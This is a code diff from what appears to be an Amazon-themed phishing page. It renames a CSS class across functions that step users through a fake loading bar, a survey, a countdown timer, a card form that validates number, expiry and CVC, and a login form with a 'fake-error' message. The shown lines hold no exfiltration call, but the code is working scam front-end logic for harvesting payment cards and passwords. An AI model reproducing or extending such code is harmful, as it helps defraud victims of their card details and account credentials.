@@ -775,16 +775,16 @@ function showaaa() {
 
 function nextStep(stepNumber) {
   hideAllSteps();
-  document.getElementById(`step${stepNumber}`).classList.remove("hidden");
+  document.getElementById(`step${stepNumber}`).classList.remove("hiddenn");
 }
 
 function hideAllSteps() {
   for (let i = 1; i <= 5; i++) {
     const stepElement = document.getElementById(`step${i}`);
-    if (stepElement) stepElement.classList.add("hidden");
+    if (stepElement) stepElement.classList.add("hiddenn");
   }
   const loading = document.getElementById("loading");
-  if (loading) loading.classList.add("hidden");
+  if (loading) loading.classList.add("hiddenn");
 }
 
 function showLoadingThenNext(stepNumber) {
@@ -793,7 +793,7 @@ function showLoadingThenNext(stepNumber) {
   const loadingText = document.getElementById("loadingText");
 
   hideAllSteps(); // 全ステップ＋ローディングを非表示にしてから
-  loading.classList.remove("hidden"); // ローディング表示
+  loading.classList.remove("hiddenn"); // ローディング表示
 
   let percent = 0;
   progress.style.width = "0%";
@@ -806,7 +806,7 @@ function showLoadingThenNext(stepNumber) {
 
     if (percent >= 100) {
       clearInterval(interval);
-      loading.classList.add("hidden");
+      loading.classList.add("hiddenn");
       nextStep(stepNumber);
     }
   }, 20);
@@ -818,14 +818,14 @@ function validateCard() {
   const cvc = document.getElementById("cvc").value.trim();
   const errorMsg = document.getElementById("cardError");
 
-  errorMsg.classList.add("hidden");
+  errorMsg.classList.add("hiddenn");
 
   const cardRegex = /^\d{12,19}$/;
   const expiryRegex = /^(0[1-9]|1[0-2])\/\d{2}$/;
   const cvcRegex = /^\d{3}$/;
 
   if (!cardRegex.test(cardNumber) || !expiryRegex.test(expiry) || !cvcRegex.test(cvc)) {
-    errorMsg.classList.remove("hidden");
+    errorMsg.classList.remove("hiddenn");
     return;
   }
 
@@ -837,7 +837,7 @@ function submitLoginInfo() {
   const password = document.getElementById("password").value.trim();
   const errorDiv = document.getElementById("fake-error");
 
-  errorDiv.classList.add("hidden");
+  errorDiv.classList.add("hiddenn");
   errorDiv.textContent = "";
 
   if (!email || !password) {
@@ -862,7 +862,7 @@ function validateSurvey() {
 
 document.addEventListener("DOMContentLoaded", () => {
   hideAllSteps();
-  document.getElementById("step1").classList.remove("hidden");
+  document.getElementById("step1").classList.remove("hiddenn");
 
   const surveyButton = document.querySelector("#step2 button.amazon-button");
   if (surveyButton) {
@@ -885,7 +885,7 @@ function startCountdown(durationSeconds, displayElement) {
 
 document.addEventListener("DOMContentLoaded", () => {
   hideAllSteps();
-  document.getElementById("step1").classList.remove("hidden");
+  document.getElementById("step1").classList.remove("hiddenn");
 
   const countdown = document.querySelector(".countdown");
   if (countdown) {
